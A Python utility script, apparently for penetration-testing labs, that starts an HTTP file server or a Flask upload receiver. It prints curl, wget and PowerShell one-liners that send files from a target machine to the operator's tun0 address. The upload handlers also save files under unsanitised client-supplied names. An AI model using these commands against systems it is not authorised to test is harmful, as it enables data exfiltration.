#!/usr/bin/python3
import argparse
import subprocess
from flask import Flask, request, jsonify
import os
import hashlib

def get_tun0_ip():
    try:
        ip = subprocess.check_output("ip a | grep -A 2 'tun0:' | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}'", shell=True).decode().strip()
    except:
        print('No tun0 - use 0.0.0.0')
        ip = '127.0.0.1'
    return ip

upload_commands = {
    "curl": f'''curl -F "file=@./<file.txt>" http://{get_tun0_ip()}/curl''',

    "wget": f'''wget --method=POST --body-file="<file.txt>" "http://{get_tun0_ip()}/wget?filename=wget.txt"''',

    "powershell": f'''$f="C:\\<file.txt>"; $b=[guid]::NewGuid(); $c=[System.Text.Encoding]::GetEncoding("iso-8859-1").GetString([IO.File]::ReadAllBytes($f)); $d="--$b`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$([IO.Path]::GetFileName($f))`"`r`nContent-Type: application/octet-stream`r`n`r`n$c`r`n--$b--`r`n"; Invoke-WebRequest -Uri "http://{get_tun0_ip()}/ps" -Method POST -Body $d -ContentType "multipart/form-data; boundary=$b"'''
}

parser = argparse.ArgumentParser(description='Simple HTTP Server for PHP, Python')
parser.add_argument('-t', '--type', type=str, default='py', help='Server Type (default: python)')
parser.add_argument('-lh', '--lhost', type=str, default='0.0.0.0', help='local ip (default:0.0.0.0)')
parser.add_argument('-lp', '--lport', type=str, default='80', help='local port (default:80)')
parser.add_argument('-T', '--transfer', action='store_true', help='File transfer for Download from target')
args = parser.parse_args()

def run_cmd(cmd):
    try:
        with subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True) as proc:
            print(cmd)
            print(f'[*] Running on {args.lhost}:{args.lport}\n')
            for line in proc.stdout:
                print(line, end='')
    except KeyboardInterrupt:
        print("\n[!] Exit.")
    except Exception as e:
        print(f"[!] Error: {e}")

if args.type.lower() == 'php' and not args.transfer:
    run_cmd(f'sudo php -S {args.lhost}:{args.lport}')

elif args.type.lower() == 'py' or args.type.lower() == 'python':
    if not args.transfer:
        run_cmd(f'sudo python3 -m http.server {args.lport} --bind {args.lhost}')

def md5sum(filepath):
    hash_md5 = hashlib.md5()
    with open(filepath, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

if args.transfer:
    print(upload_commands["curl"])
    print()
    print(upload_commands["wget"])
    print()
    print(upload_commands["powershell"])
    print()
    print('CertUtil -hashfile <file> MD5')
    print()
    app = Flask(__name__)
    UPLOAD_FOLDER = os.getcwd()
    app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

    @app.route('/curl', methods=['POST'])
    @app.route('/ps', methods=['POST'])
    def upload_file():
        if 'file' not in request.files:
            return jsonify({'error': 'No file part in the request'}), 400
        file = request.files['file']
        if file.filename == '':
            return jsonify({'error': 'No selected file'}), 400

        filepath = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)
        file.save(filepath)

        file_size = os.path.getsize(filepath)
        checksum = md5sum(filepath)
        print()
        print(f'[UPLOAD] {file.filename}', flush=True)
        print(f'[SIZE]   {round(file_size / 1024, 2)} KB', flush=True)
        print(f'[MD5]    {checksum}', flush=True)
        return jsonify({
            'message': f'File "{file.filename}" saved successfully.',
            'size_bytes': file_size,
            'size_kb': round(file_size / 1024, 2),
            'size_mb': round(file_size / (1024 * 1024), 2),
            'md5': checksum
        }), 200

    @app.route('/wget', methods=['POST'])
    def upload_raw():
        filename = request.args.get('filename', 'uploaded_file.bin')
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)

        with open(filepath, 'wb') as f:
            f.write(request.data)

        file_size = os.path.getsize(filepath)
        checksum = md5sum(filepath)
        print()
        print(f'[UPLOAD] {filename}', flush=True)
        print(f'[SIZE]   {round(file_size / 1024, 2)} KB', flush=True)
        print(f'[MD5]    {checksum}', flush=True)
        return jsonify({
            'message': f'Raw file "{filename}" saved successfully.',
            'size_bytes': file_size,
            'md5': checksum
        }), 200

    if __name__ == '__main__':
        app.run(host=args.lhost, port=args.lport)
